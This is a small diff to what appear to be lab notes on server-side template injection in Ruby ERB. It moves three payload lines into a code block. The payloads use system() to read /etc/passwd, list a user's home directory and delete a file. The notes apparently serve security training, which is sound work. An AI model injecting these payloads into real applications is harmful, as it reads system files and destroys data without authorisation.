@@ -23,9 +23,11 @@
 - you can use this syntax to write your code: `<%= someExpression %>`. 
 - you can use the `system()` method to execute arbitrary system commands.
  
-><%= system('cat /etc/passwd') %>
-><%= system('ls -al /home/carlos') %>
-><%= system('rm -r /home/carlos/morale.txt') %>
+```
+<%= system('cat /etc/passwd') %>
+<%= system('ls -al /home/carlos') %>
+<%= system('rm -r /home/carlos/morale.txt') %>
+``` 
 
 -----------------------------------------------------------------------
 
